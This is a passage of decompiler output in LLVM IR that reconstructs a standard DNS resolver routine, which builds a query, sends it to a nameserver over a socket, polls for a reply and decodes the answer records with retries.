  %v6_192a8 = bitcast i8* %stack_var_-188 to i32*
  %v2_19388 = ptrtoint i32* %stack_var_-92 to i32
  %v3_19420 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_19484 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_197d0 = icmp eq i1 %v7_191cc, false
  %v7_194d8 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_195bc = ptrtoint i32* %stack_var_-140 to i32
  %v9_196b4 = icmp eq i32 %tmp147, %arg2
  %v7_19648 = icmp eq i32 %arg2, 1
  %v2_195f0 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_19244, 3
  br i1 %tmp292, label %dec_label_pc_1924c.lr.ph.preheader.lr.ph, label %dec_label_pc_19884

dec_label_pc_1924c.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_191b4
  %v2_1955c = icmp eq i32 %tmp156, 0
  %v8_1964c = icmp eq i32 %arg2, 28
  br label %dec_label_pc_1924c.lr.ph.preheader

dec_label_pc_1924c:                               ; preds = %dec_label_pc_1924c.lr.ph, %dec_label_pc_19868.backedge
  %v1_19254 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_1924c.lr.ph ], [ %v0_193fc, %dec_label_pc_19868.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_1924c.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_19868.backedge ]
  %v7_19250 = icmp eq i32 %v1_19254, -1
  br i1 %v7_19250, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_1924c
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_1924c, %bb199
  %v1_19258 = xor i1 %v7_19250, true
  call void @__pseudo_cond_branch(i1 %v1_19258, i32 ptrtoint (i32* @global_var_14054.1133 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_19264, i32* @r4, align 4
  %v0_19268 = load i32, i32* @r7, align 4
  %v2_1926c = inttoptr i32 %v0_19268 to i8*
  %v3_1926c = call i32 @__GI_memset(i8* %v2_1926c, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_1927c = call i32 @__GI_memset(i8* nonnull %stack_var_-188, i32 0)
  %v0_19280 = load i32, i32* @sb, align 4
  %v1_19280 = add i32 %v0_19280, 1
  %v3_19288 = urem i32 %v1_19280, 65536
  store i32 %v3_19288, i32* @sb, align 4
  %v0_19294 = load i32, i32* @r7, align 4
  %v5_192a0 = trunc i32 %v1_19280 to i8
  store i8 %v5_192a0, i8* %stack_var_-188, align 1
  %v7_192a8 = call i32 @__encode_header(i32* %v6_192a8, i32 %v0_19294, i32 512, i32 1, i32 %v1_19280)
  store i32 %v7_192a8, i32* @r5, align 4
  %v1_192ac = icmp slt i32 %v7_192a8, 0
  br i1 %v1_192ac, label %dec_label_pc_19884, label %dec_label_pc_192b4

dec_label_pc_192b4:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_192bc = load i32, i32* %stack_var_-236, align 4
  %v4_192c0 = call i32 @strncpy(i32 %v2_192bc, i32 %tmp, i32 1025)
  store i32 %v2_191c8, i32* @r0, align 4
  %v1_192d8 = call i32 @__pthread_return_void()
  %v1_192e8 = call i32 @__pthread_return_0()
  %v1_192f8 = load i32, i32* @sl, align 4
  %v4_192f8 = mul i32 %v1_192f8, 4
  %v5_192f8 = add i32 %v4_192f8, %arg4
  %v6_192f8 = inttoptr i32 %v5_192f8 to i32*
  %v7_192f8 = load i32, i32* %v6_192f8, align 4
  store i32 %v7_192f8, i32* @r6, align 4
  br i1 %v1_192f4, label %dec_label_pc_1933c, label %dec_label_pc_19300

dec_label_pc_19300:                               ; preds = %dec_label_pc_192b4
  %v2_19308 = load i32, i32* @global_var_2ef84.1136, align 4
  %v6_19310 = icmp slt i32 %v6_1982c, %v2_19308
  br i1 %v6_19310, label %dec_label_pc_19314, label %dec_label_pc_1933c

dec_label_pc_19314:                               ; preds = %dec_label_pc_19300
  store i32 ptrtoint (i32* @global_var_20678.1138 to i32), i32* @r1, align 4
  %v2_1931c = load i32, i32* %stack_var_-236, align 4
  %v4_19320 = inttoptr i32 %v2_1931c to i8*
  %v5_19320 = call i32 @__GI_strncat(i8* %v4_19320, i32 ptrtoint (i32* @global_var_20678.1138 to i32), i32 1025, i32 %v2_19308)
  %v7_19330 = load i32, i32* %v6_19330, align 4
  store i32 %v7_19330, i32* @r1, align 4
  %v4_19338 = inttoptr i32 %v2_1931c to i8*
  %v5_19338 = call i32 @__GI_strncat(i8* %v4_19338, i32 %v7_19330, i32 1025, i32 ptrtoint (i32* @global_var_2ef64.1140 to i32))
  br label %dec_label_pc_1933c

dec_label_pc_1933c:                               ; preds = %dec_label_pc_19300, %dec_label_pc_192b4, %dec_label_pc_19314
  store i32 %v2_191c8, i32* @r0, align 4
  store i32 103248, i32* @lr, align 4
  %v1_1934c = call i32 @__pthread_return_void()
  %v2_19358 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_19358, i32* %stack_var_-56, align 4
  %v0_19368 = load i32, i32* @r7, align 4
  %v1_19368 = load i32, i32* @r5, align 4
  %v2_19368 = add i32 %v1_19368, %v0_19368
  %v1_1936c = sub i32 512, %v1_19368
  %v8_19374 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_19368, i32 %v1_1936c, i32 %arg2, i32 %v2_19358, i32 %arg2, i32 1)
  store i32 %v8_19374, i32* @fp, align 4
  %v1_19378 = icmp slt i32 %v8_19374, 0
  br i1 %v1_19378, label %dec_label_pc_19884, label %dec_label_pc_19380

dec_label_pc_19380:                               ; preds = %dec_label_pc_1933c
  store i32 0, i32* @r4, align 4
  %v0_19390 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_1939c = inttoptr i32 %v0_19390 to i8*
  %v4_1939c = call i32 @inet_pton(i32 10, i8* %v3_1939c, i32 %v2_19388)
  %v1_193a0 = load i32, i32* @r4, align 4
  %v7_193a4 = icmp sgt i32 %v4_1939c, %v1_193a0
  br i1 %v7_193a4, label %bb201, label %dec_label_pc_19380..thread11_crit_edge

dec_label_pc_19380..thread11_crit_edge:           ; preds = %dec_label_pc_19380
  %v3_193b0.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_19380
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_19380..thread11_crit_edge, %bb201
  %v3_193b0 = phi i8 [ %v3_193b0.pre, %dec_label_pc_19380..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_193b0 = sext i8 %v3_193b0 to i32
  %v8_193ac.op = urem i32 %v1_193a0, 256
  %v8_193ac.op.op = mul nuw nsw i32 %v8_193ac.op, 256
  %v4_193b8 = select i1 %v7_193a4, i32 %v8_193ac.op.op, i32 0
  %v5_193b8 = or i32 %v4_193b0, %v4_193b8
  %v7_193bc = icmp eq i32 %v5_193b8, 10
  br i1 %v7_193bc, label %dec_label_pc_193e8, label %dec_label_pc_193d0

dec_label_pc_193d0:                               ; preds = %.thread11
  %v0_193d4 = load i32, i32* @r6, align 4
  store i32 %v0_193d4, i32* @r0, align 4
  %v1_193e0 = call i32 @inet_addr(i32 %v0_193d4)
  br label %dec_label_pc_193e8

dec_label_pc_193e8:                               ; preds = %.thread11, %dec_label_pc_193d0
  %v0_193fc = call i32 @socket()
  %v1_19400 = icmp slt i32 %v0_193fc, 0
  br i1 %v1_19400, label %.thread, label %dec_label_pc_19418

.thread:                                          ; preds = %dec_label_pc_193e8
  br label %dec_label_pc_19868.backedge

dec_label_pc_19868.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_1924c, label %dec_label_pc_19884

dec_label_pc_19418:                               ; preds = %dec_label_pc_193e8
  %v4_19420 = call i32 @__libc_connect(i32 %v0_193fc, %sockaddr* nonnull %v3_19420, i32 28)
  %v1_19424 = icmp slt i32 %v4_19420, 0
  br i1 %v1_19424, label %dec_label_pc_1942c, label %dec_label_pc_1944c

dec_label_pc_1942c:                               ; preds = %dec_label_pc_19418
  %v0_1942c = call i32 @__errno_location()
  %v1_19430 = inttoptr i32 %v0_1942c to i32*
  %v2_19430 = load i32, i32* %v1_19430, align 4
  %v7_19434 = icmp eq i32 %v2_19430, 101
  br i1 %v7_19434, label %dec_label_pc_19798, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_1942c
  br label %dec_label_pc_19868.backedge

dec_label_pc_1944c:                               ; preds = %dec_label_pc_19418
  %v0_1944c = load i32, i32* @r5, align 4
  %v1_1944c = load i32, i32* @fp, align 4
  %v2_1944c = add i32 %v1_1944c, %v0_1944c
  %v0_19450 = load i32, i32* @r7, align 4
  %v4_1945c = inttoptr i32 %v0_19450 to i32*
  %v5_1945c = call i32 @__libc_send(i32 %v0_193fc, i32* %v4_1945c, i32 %v2_1944c, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v0_193fc, i32* %stack_var_-44, align 4
  %v11_19484 = call i32 @__libc_poll(%pollfd* %v10_19484, i32 1, i32 10000, i32 1, i32 %v0_193fc, i32 1, i32 0)
  %v1_19488 = load i32, i32* @r4, align 4
  %v7_1948c = icmp sgt i32 %v11_19484, %v1_19488
  br i1 %v7_1948c, label %dec_label_pc_19490, label %dec_label_pc_19798

dec_label_pc_19490:                               ; preds = %dec_label_pc_1944c
  %v0_19498 = load i32, i32* @r7, align 4
  %v5_194a0 = inttoptr i32 %v0_19498 to i32*
  %v6_194a0 = call i32 @__libc_recv(i32 %v0_193fc, i32* %v5_194a0, i32 512, i32 %v1_19488, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_194a0, i32* @fp, align 4
  %v7_194ac = icmp slt i32 %v6_194a0, 12
  br i1 %v7_194ac, label %dec_label_pc_197cc, label %dec_label_pc_194b0

dec_label_pc_194b0:                               ; preds = %dec_label_pc_19490
  %v0_194b0 = load i32, i32* @r7, align 4
  %v2_194b8 = inttoptr i32 %v0_194b0 to i8*
  %v3_194b8 = call i32 @__decode_header(i8* %v2_194b8, i32 %v2_19264)
  %v3_194bc = load i8, i8* %stack_var_-188, align 1
  %v4_194bc = sext i8 %v3_194bc to i32
  store i32 %v4_194bc, i32* @r6, align 4
  %v1_194c0 = load i32, i32* @sb, align 4
  %v9_194c0 = icmp eq i32 %v4_194bc, %v1_194c0
  br i1 %v9_194c0, label %dec_label_pc_194c8, label %dec_label_pc_197cc

dec_label_pc_194c8:                               ; preds = %dec_label_pc_194b0
  %v1_194cc = load i32, i32* @r4, align 4
  %v9_194cc = icmp eq i32 %tmp157, %v1_194cc
  br i1 %v9_194cc, label %dec_label_pc_197cc, label %dec_label_pc_194d4

dec_label_pc_194d4:                               ; preds = %dec_label_pc_194c8
  br i1 %v7_194d8, label %dec_label_pc_194e0, label %dec_label_pc_1955c

dec_label_pc_194e0:                               ; preds = %dec_label_pc_194d4
  %v9_194e4 = icmp eq i32 %., %v1_194cc
  br i1 %v9_194e4, label %dec_label_pc_194ec, label %dec_label_pc_19550

dec_label_pc_194ec:                               ; preds = %dec_label_pc_194e0
  store i32 %v2_191c8, i32* @r5, align 4
  store i32 %v2_191c8, i32* @r0, align 4
  %v1_19504 = call i32 @__pthread_return_void()
  %v1_19514 = call i32 @__pthread_return_0()
  store i32 %v2_191c8, i32* @r0, align 4
  %v2_19520 = load i32, i32* @global_var_2ef84.1136, align 4
  %v1_19530 = call i32 @__pthread_return_void()
  %v1_19538 = add i32 %v2_19520, -1
  store i32 %v1_19538, i32* @r4, align 4
  %v5_19540 = icmp slt i32 %v6_1982c, %v1_19538
  br i1 %v5_19540, label %.thread19, label %dec_label_pc_19550

.thread19:                                        ; preds = %dec_label_pc_194ec
  %v7_19540 = add i32 %v6_1982c, 1
  %v6_19544 = load i32, i32* @r6, align 4
  store i32 %v6_19544, i32* @sb, align 4
  br label %dec_label_pc_19868.outer.backedge

dec_label_pc_19550:                               ; preds = %dec_label_pc_194ec, %dec_label_pc_194e0
  %v0_19550 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_19580

dec_label_pc_1955c:                               ; preds = %dec_label_pc_194d4
  br i1 %v2_1955c, label %dec_label_pc_19564, label %dec_label_pc_197cc

dec_label_pc_19564:                               ; preds = %dec_label_pc_1955c
  br i1 %tmp198, label %dec_label_pc_19578, label %dec_label_pc_19590.preheader

dec_label_pc_19590.preheader:                     ; preds = %dec_label_pc_19564
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_19590

dec_label_pc_19578:                               ; preds = %dec_label_pc_19564
  %v0_19578 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_19580

dec_label_pc_19580:                               ; preds = %dec_label_pc_19550, %dec_label_pc_19578
  %storemerge4 = phi i32 [ %v0_19578, %dec_label_pc_19578 ], [ %v0_19550, %dec_label_pc_19550 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_19578 ], [ 1, %dec_label_pc_19550 ]
  %v2_19580 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_19580, align 4
  br label %dec_label_pc_19894

dec_label_pc_19588:                               ; preds = %dec_label_pc_19590
  %v2_19588 = call i32 @__length_question(i32 %v0_1959c, i32 %v0_19598)
  %v0_1958c = load i32, i32* @r5, align 4
  %v2_1958c = add i32 %v0_1958c, %v2_19588
  store i32 %v2_1958c, i32* @r5, align 4
  %v0_19594.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19590

dec_label_pc_19590:                               ; preds = %dec_label_pc_19590.preheader, %dec_label_pc_19588
  %v0_19598 = phi i32 [ 12, %dec_label_pc_19590.preheader ], [ %v2_1958c, %dec_label_pc_19588 ]
  %v0_195a0 = phi i32 [ 0, %dec_label_pc_19590.preheader ], [ %v0_19594.pre, %dec_label_pc_19588 ]
  store i32 %v0_19598, i32* @r1, align 4
  %v0_1959c = load i32, i32* @r7, align 4
  store i32 %v0_1959c, i32* @r0, align 4
  %v1_195a0 = add i32 %v0_195a0, 1
  store i32 %v1_195a0, i32* @r4, align 4
  %v5_195a4 = icmp slt i32 %v0_195a0, 1
  br i1 %v5_195a4, label %dec_label_pc_19588, label %dec_label_pc_195a8

dec_label_pc_195a8:                               ; preds = %dec_label_pc_19590
  br label %dec_label_pc_19704

dec_label_pc_195bc:                               ; preds = %bb205
  store i32 %v2_195bc, i32* @r4, align 4
  %v0_195c0 = load i32, i32* @r7, align 4
  %v0_195c8 = load i32, i32* @fp, align 4
  %v5_195d0 = call i32 @__decode_answer(i32 %v0_195c0, i32 %v0_195c4, i32 %v0_195c8, i32* nonnull %stack_var_-140)
  %v1_195d4 = icmp slt i32 %v5_195d0, 0
  br i1 %v1_195d4, label %dec_label_pc_195e0, label %dec_label_pc_195fc

dec_label_pc_195e0:                               ; preds = %dec_label_pc_195bc
  %v2_195e4 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_195e4, label %dec_label_pc_197cc, label %dec_label_pc_195ec

dec_label_pc_195ec:                               ; preds = %dec_label_pc_195e0
  br i1 %v2_195f0, label %dec_label_pc_197cc, label %dec_label_pc_19718

dec_label_pc_195fc:                               ; preds = %dec_label_pc_195bc
  %v2_19600 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_19600, label %dec_label_pc_196a4, label %dec_label_pc_19608

dec_label_pc_19608:                               ; preds = %dec_label_pc_195fc
  %v0_19608 = load i32, i32* @r8, align 4
  %v6_1960c = add i32 %v0_19608, 36
  %v7_1960c = inttoptr i32 %v6_1960c to i32*
  %v8_1960c = load i32, i32* %v7_1960c, align 4
  store i32 %v8_1960c, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_195bc, i32* @r1, align 4
  store i32 %v0_19608, i32* @r0, align 4
  %v0_19628 = call i32 @memcpy()
  %v0_1962c = load i32, i32* @r8, align 4
  %v1_1962c = add i32 %v0_1962c, 4
  %v2_1962c = inttoptr i32 %v1_1962c to i32*
  %v3_1962c = load i32, i32* %v2_1962c, align 4
  %v7_19630 = icmp eq i32 %v3_1962c, 24
  br i1 %v7_19630, label %dec_label_pc_19654, label %dec_label_pc_19638

dec_label_pc_19638:                               ; preds = %dec_label_pc_19608
  %v1_19638 = add i32 %v0_1962c, 28
  %v2_19638 = inttoptr i32 %v1_19638 to i32*
  %v3_19638 = load i32, i32* %v2_19638, align 4
  %v2_1963c = icmp eq i32 %v3_19638, 0
  br i1 %v2_1963c, label %dec_label_pc_19718, label %dec_label_pc_19644

dec_label_pc_19644:                               ; preds = %dec_label_pc_19638
  br i1 %v7_19648, label %dec_label_pc_19654, label %bb203

bb203:                                            ; preds = %dec_label_pc_19644
  br i1 %v8_1964c, label %dec_label_pc_19654, label %dec_label_pc_19718

dec_label_pc_19654:                               ; preds = %dec_label_pc_19644, %bb203, %dec_label_pc_19608
  %v9_19658 = icmp eq i32 %v3_1962c, %arg2
  br i1 %v9_19658, label %dec_label_pc_1966c, label %dec_label_pc_19660

dec_label_pc_19660:                               ; preds = %dec_label_pc_19654
  %v1_19660 = inttoptr i32 %v0_1962c to i32*
  %v2_19660 = load i32, i32* %v1_19660, align 4
  %v1_19664 = call i32 @free(i32 %v2_19660)
  br label %dec_label_pc_196f0

dec_label_pc_1966c:                               ; preds = %dec_label_pc_19654
  %v1_19674 = add i32 %v0_1962c, 16
  %v2_19674 = inttoptr i32 %v1_19674 to i32*
  %v3_19674 = load i32, i32* %v2_19674, align 4
  %v2_19678 = sub i32 %tmp155, %stack_var_-192.0
  %v1_1967c = add i32 %v2_19678, -1
  %v1_19680 = add i32 %v3_19674, 4
  %v2_19684 = mul i32 %v1_19680, %v1_1967c
  %v1_19688 = add i32 %v0_1962c, 32
  %v2_19688 = inttoptr i32 %v1_19688 to i32*
  %v3_19688 = load i32, i32* %v2_19688, align 4
  %v2_19690 = add i32 %v0_1962c, 36
  %v3_19690 = inttoptr i32 %v2_19690 to i32*
  store i32 %v1_1967c, i32* %v3_19690, align 4
  %tmp294 = icmp ugt i32 %v2_19684, %v3_19688
  br i1 %tmp294, label %dec_label_pc_19718, label %dec_label_pc_1966c.dec_label_pc_196ec_crit_edge

dec_label_pc_1966c.dec_label_pc_196ec_crit_edge:  ; preds = %dec_label_pc_1966c
  %v1_196ec.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_196ec

dec_label_pc_196a4:                               ; preds = %dec_label_pc_195fc
  %v3_196a4 = load i32, i32* %stack_var_-140, align 4
  %v1_196a8 = call i32 @free(i32 %v3_196a4)
  br i1 %v9_196b4, label %dec_label_pc_196bc, label %dec_label_pc_196f0

dec_label_pc_196bc:                               ; preds = %dec_label_pc_196a4
  %v0_196bc = load i32, i32* @r8, align 4
  %v1_196bc = add i32 %v0_196bc, 16
  %v2_196bc = inttoptr i32 %v1_196bc to i32*
  %v3_196bc = load i32, i32* %v2_196bc, align 4
  %v9_196c4 = icmp eq i32 %v3_196bc, %tmp146
  br i1 %v9_196c4, label %dec_label_pc_196cc, label %dec_label_pc_197c4

dec_label_pc_196cc:                               ; preds = %dec_label_pc_196bc
  %v1_196cc = add i32 %v0_196bc, 36
  %v2_196cc = inttoptr i32 %v1_196cc to i32*
  %v3_196cc = load i32, i32* %v2_196cc, align 4
  %v1_196d0 = add i32 %v0_196bc, 28
  %v2_196d0 = inttoptr i32 %v1_196d0 to i32*
  %v3_196d0 = load i32, i32* %v2_196d0, align 4
  %v3_196d4 = mul i32 %v3_196cc, %tmp146
  %v4_196d4 = add i32 %v3_196d0, %v3_196d4
  store i32 %v4_196d4, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_196e0 = call i32 @memcpy()
  %v0_196e4 = load i32, i32* @r8, align 4
  %v1_196e4 = add i32 %v0_196e4, 36
  %v2_196e4 = inttoptr i32 %v1_196e4 to i32*
  %v3_196e4 = load i32, i32* %v2_196e4, align 4
  %v1_196e8 = add i32 %v3_196e4, 1
  br label %dec_label_pc_196ec

dec_label_pc_196ec:                               ; preds = %dec_label_pc_1966c.dec_label_pc_196ec_crit_edge, %dec_label_pc_196cc
  %v1_196ec = phi i32 [ %v0_196e4, %dec_label_pc_196cc ], [ %v1_196ec.pre, %dec_label_pc_1966c.dec_label_pc_196ec_crit_edge ]
  %storemerge5 = phi i32 [ %v1_196e8, %dec_label_pc_196cc ], [ 0, %dec_label_pc_1966c.dec_label_pc_196ec_crit_edge ]
  %v2_196ec = add i32 %v1_196ec, 36
  %v3_196ec = inttoptr i32 %v2_196ec to i32*
  store i32 %storemerge5, i32* %v3_196ec, align 4
  br label %dec_label_pc_196f0

dec_label_pc_196f0:                               ; preds = %dec_label_pc_196a4, %dec_label_pc_19660, %dec_label_pc_196ec
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_196ec ], [ 0, %dec_label_pc_196a4 ], [ %stack_var_-212.2, %dec_label_pc_19660 ]
  %v1_196f8 = add i32 %stack_var_-192.0, 1
  %v0_19700 = load i32, i32* @r5, align 4
  %v2_19700 = add i32 %v0_19700, %v5_195d0
  store i32 %v2_19700, i32* @r5, align 4
  br label %dec_label_pc_19704

dec_label_pc_19704:                               ; preds = %dec_label_pc_195a8, %dec_label_pc_196f0
  %v0_195c4 = phi i32 [ %v0_19598, %dec_label_pc_195a8 ], [ %v2_19700, %dec_label_pc_196f0 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_195a8 ], [ %stack_var_-212.1, %dec_label_pc_196f0 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_195a8 ], [ %v1_196f8, %dec_label_pc_196f0 ]
  %v2_1970c = sub i32 %stack_var_-192.0, %tmp155
  %v4_1970c = xor i32 %stack_var_-192.0, %tmp155
  %v5_1970c = xor i32 %v2_1970c, %stack_var_-192.0
  %v6_1970c = and i32 %v5_1970c, %v4_1970c
  %v5_19710 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_19710, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_19704
  %v7_19710 = load i32, i32* @fp, align 4
  %v8_19710 = sub i32 %v0_195c4, %v7_19710
  %v10_19710 = xor i32 %v7_19710, %v0_195c4
  %v11_19710 = xor i32 %v8_19710, %v0_195c4
  %v12_19710 = and i32 %v11_19710, %v10_19710
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_19704, %bb204
  %v1_19714.in = phi i32 [ %v6_1970c, %dec_label_pc_19704 ], [ %v12_19710, %bb204 ]
  %v0_19714.in = phi i32 [ %v2_1970c, %dec_label_pc_19704 ], [ %v8_19710, %bb204 ]
  %v0_19714 = icmp slt i32 %v0_19714.in, 0
  %v1_19714 = icmp slt i32 %v1_19714.in, 0
  %v2_19714 = xor i1 %v1_19714, %v0_19714
  br i1 %v2_19714, label %dec_label_pc_195bc, label %dec_label_pc_19718

dec_label_pc_19718:                               ; preds = %dec_label_pc_195ec, %bb203, %dec_label_pc_1966c, %dec_label_pc_19638, %bb205
  %v1_1971c = call i32 @__libc_close(i32 %v0_193fc)
  %v3_19720 = load i32, i32* %stack_var_0, align 4
  %v2_19724 = icmp eq i32 %v3_19720, 0
  br i1 %v2_19724, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_19718
  %v1_1972c = load i32, i32* @r7, align 4
  %v3_19728 = inttoptr i32 %v3_19720 to i32*
  store i32 %v1_1972c, i32* %v3_19728, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_19718
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 104244, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_19724, i32 ptrtoint (i32* @global_var_167b4.1142 to i32))
  %v2_19734 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_191c8, i32* @r4, align 4
  %v1_1973c = call i32 @free(i32 %v2_19734)
  store i32 %v2_191c8, i32* @r0, align 4
  %v1_19754 = call i32 @__pthread_return_void()
  %v1_19764 = call i32 @__pthread_return_0()
  %v0_19770 = load i32, i32* @r6, align 4
  %v3_19770 = sdiv i32 %v0_19770, 256
  %v0_19774 = load i32, i32* @sl, align 4
  store i32 %v0_19774, i32* @global_var_2eeb4.1128, align 4
  store i32 %v2_191c8, i32* @r0, align 4
  %v1_19780 = trunc i32 %v3_19770 to i8
  store i8 %v1_19780, i8* @global_var_28c09.1131, align 1
  %v1_19784 = trunc i32 %v0_19770 to i8
  store i8 %v1_19784, i8* bitcast (i8** @global_var_28c08.1130 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_19794.1143 to i32), i32* @lr, align 4
  %v1_19790 = call i32 @__pthread_return_void()
  %v0_1991c.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_1991c

dec_label_pc_19798:                               ; preds = %dec_label_pc_1942c, %dec_label_pc_1944c
  %v0_19798 = load i32, i32* @sl, align 4
  %v1_19798 = add i32 %v0_19798, 1
  %v2_197a0 = srem i32 %v1_19798, %arg3
  store i32 %v2_197a0, i32* @sl, align 4
  %v2_197a4 = icmp eq i32 %v2_197a0, 0
  br i1 %v2_197a4, label %dec_label_pc_197ac, label %dec_label_pc_19864.backedge

dec_label_pc_197ac:                               ; preds = %dec_label_pc_19798
  %v1_197b4 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_19868.outer.backedge

dec_label_pc_19868.outer.backedge:                ; preds = %dec_label_pc_197ac, %dec_label_pc_19848, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_19540, %.thread19 ], [ -1, %dec_label_pc_19848 ], [ -1, %dec_label_pc_197ac ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_19850, %dec_label_pc_19848 ], [ %v1_197b4, %dec_label_pc_197ac ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_1924c.lr.ph, label %dec_label_pc_19884

dec_label_pc_197c4:                               ; preds = %dec_label_pc_196bc
  %v1_197c4 = inttoptr i32 %v0_196bc to i32*
  %v2_197c4 = load i32, i32* %v1_197c4, align 4
  %v1_197c8 = call i32 @free(i32 %v2_197c4)
  br label %dec_label_pc_197cc

dec_label_pc_197cc:                               ; preds = %dec_label_pc_1955c, %dec_label_pc_194b0, %dec_label_pc_195ec, %dec_label_pc_195e0, %dec_label_pc_194c8, %dec_label_pc_19490, %dec_label_pc_197c4
  br i1 %v2_197d0, label %dec_label_pc_197d8, label %dec_label_pc_19834

dec_label_pc_197d8:                               ; preds = %dec_label_pc_197cc
  store i32 %v2_191c8, i32* @r5, align 4
  store i32 %v2_191c8, i32* @r0, align 4
  %v1_197f0 = call i32 @__pthread_return_void()
  %v1_19800 = call i32 @__pthread_return_0()
  %v2_1980c = load i32, i32* @global_var_2ef84.1136, align 4
  store i32 %v2_191c8, i32* @r0, align 4
  %v1_1981c = call i32 @__pthread_return_void()
  %v1_19824 = add i32 %v2_1980c, -1
  store i32 %v1_19824, i32* @r4, align 4
  %v5_1982c = icmp slt i32 %v6_1982c, %v1_19824
  br i1 %v5_1982c, label %.thread27, label %dec_label_pc_19834

.thread27:                                        ; preds = %dec_label_pc_197d8
  %v7_1982c = add i32 %v6_1982c, 1
  br label %dec_label_pc_19864.backedge

dec_label_pc_19834:                               ; preds = %dec_label_pc_197d8, %dec_label_pc_197cc
  %v0_19834 = load i32, i32* @sl, align 4
  %v1_19834 = add i32 %v0_19834, 1
  %v2_1983c = srem i32 %v1_19834, %arg3
  store i32 %v2_1983c, i32* @sl, align 4
  %v2_19840 = icmp eq i32 %v2_1983c, 0
  br i1 %v2_19840, label %dec_label_pc_19848, label %dec_label_pc_19864.backedge

dec_label_pc_19848:                               ; preds = %dec_label_pc_19834
  %v1_19850 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_19868.outer.backedge

dec_label_pc_19864.backedge:                      ; preds = %dec_label_pc_19798, %dec_label_pc_19834, %.thread27
  %storemerge87 = phi i32 [ %v7_1982c, %.thread27 ], [ -1, %dec_label_pc_19834 ], [ -1, %dec_label_pc_19798 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_1924c.lr.ph.preheader, label %dec_label_pc_19884

dec_label_pc_1924c.lr.ph.preheader:               ; preds = %dec_label_pc_1924c.lr.ph.preheader.lr.ph, %dec_label_pc_19864.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_1924c.lr.ph.preheader.lr.ph ], [ %v0_193fc, %dec_label_pc_19864.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_19244, %dec_label_pc_1924c.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_19864.backedge ]
  %v0_19864259 = phi i32 [ -1, %dec_label_pc_1924c.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_19864.backedge ]
  br label %dec_label_pc_1924c.lr.ph

dec_label_pc_1924c.lr.ph:                         ; preds = %dec_label_pc_1924c.lr.ph.preheader, %dec_label_pc_19868.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v0_193fc, %dec_label_pc_19868.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_1924c.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_19868.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_1924c.lr.ph.preheader ]
  %v6_1982c = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_19868.outer.backedge ], [ %v0_19864259, %dec_label_pc_1924c.lr.ph.preheader ]
  %v1_192f4 = icmp slt i32 %v6_1982c, 0
